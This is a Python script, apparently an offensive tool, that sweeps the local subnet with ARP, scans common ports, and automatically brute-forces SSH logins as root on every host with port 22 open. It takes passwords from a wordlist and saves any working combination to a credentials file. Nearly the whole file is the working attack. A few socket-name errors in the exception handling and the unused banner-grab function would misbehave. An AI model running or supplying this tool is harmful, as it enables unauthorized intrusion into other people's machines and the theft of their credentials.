import socket

import scapy.all as scapy
from socket import *
import time
import paramiko
from colorama import init, Fore

import netifaces as ni

# initialize colorama
init()

GREEN = Fore.GREEN
RED = Fore.RED
RESET = Fore.RESET
BLUE = Fore.BLUE


def is_ssh_open(hostname, username, password):
    # initialize SSH client
    client = paramiko.SSHClient()
    # add to know hosts
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname, username=username, password=password, timeout=3)
    except socket.timeout:
        # this is when host is unreachable
        print(f"{RED}[!] Host: {hostname} is unreachable, timed out.{RESET}")
        return False
    except paramiko.AuthenticationException:
        print(f"[!] Invalid credentials for {username}:{password}")
        return False

    except paramiko.SSHException:
        print(f"{BLUE}[*] Quota exceeded, retrying with delay...{RESET}")
        # sleep for a minute
        time.sleep(60)
        return is_ssh_open(hostname, username, password)

    except:
        return False

    else:
        # connection was established successfully
        print(f"{GREEN}[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
        return True


def init_brute_force(host, username):
    # import argparse
    # parser = argparse.ArgumentParser(description="SSH Bruteforce Python script.")
    # parser.add_argument("host", help="Hostname or IP Address of SSH Server to bruteforce.")
    # parser.add_argument("-P", "--passlist", help="File that contain password list in each line.")
    # parser.add_argument("-u", "--user", help="Host username.")

    # parse passed arguments
    # args = parser.parse_args()
    # host = args.host
    # passlist = args.passlist
    # user = args.user
    # read the file
    passlist = open("passlist.txt", "r").read().splitlines()
    # brute-force
    for password in passlist:
        if is_ssh_open(host, username, password):
            # if combo is valid, save it to a file
            open("credentials.txt", "w").write(f"{username}@{host}:{password}")
            break


def check_network_address():
    ip = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
    netmask = ni.ifaddresses('eth0')[ni.AF_INET][0]['netmask']
    return ip, netmask


def convert_netmask_to_CIDR(netmask: str):
    list_mask = netmask.split(".")
    processing = list()
    for octet in list_mask:
        processing.append(str(bin(int(octet))).count("1"))
    return sum(processing)


def provide_range(ip_address: str, netmask):
    converted_CIDR = convert_netmask_to_CIDR(netmask)
    list_elements = ip_address.split(".")
    list_elements.pop()
    list_elements.append(f"0/{converted_CIDR}")
    return ".".join(list_elements)


def scan_for_active_ips():
    request = scapy.ARP()
    address = check_network_address()
    print(f"Your IP_ADDRESS is : {address[0]}")
    print(f"Your NETMASK is : {address[1]}")
    request.pdst = provide_range(str(address[0]), str(address[1]))
    broadcast = scapy.Ether()

    broadcast.dst = 'ff:ff:ff:ff:ff:ff'

    request_broadcast = broadcast / request
    clients = scapy.srp(request_broadcast, timeout=10, verbose=1)[0]
    results = []
    print("ACTIVE DEVICES:")
    print("===========================================")
    for element in clients:
        print(element[1].psrc + "	 " + element[1].hwsrc)
        results.append(element[1].psrc)
    print("===========================================")
    return results


def ports_scan(ips_list: []):
    print("ACTIVE PORTS FOR IPS")
    print("===========================================")
    ports = {}
    for i in ips_list:
        startTime = time.time()
        target = i
        t_IP = gethostbyname(target)
        print('Starting scan on host: ', t_IP)

        active_ports = []
        ports_to_scan = [20, 21, 22, 80]
        for i in ports_to_scan:
            s = socket(AF_INET, SOCK_STREAM)
            s.settimeout(1)
            conn = s.connect_ex((t_IP, i))
            if conn == 0:
                print('Port %d: OPEN' % (i,))
                active_ports.append(i)
            s.close()
        ports[target] = active_ports
        print('Time taken:', time.time() - startTime)
    print(ports)
    print("===========================================")
    return ports


def banner_grab(ip_address, port):
    try:
        s = socket.socket()
        s.connect((ip_address, port))
        banner = s.recv(1024)
        s.close()
        return banner.decode()
    except:
        return ''


if __name__ == '__main__':
    results = scan_for_active_ips()
    ports = ports_scan(results)
    host_to_brute = []
    hosts_to_check = ports.keys()
    for host in hosts_to_check:
        values = ports.get(host)
        if 22 in values:
            host_to_brute.append(host)

    for host in host_to_brute:
        init_brute_force(host, "root")
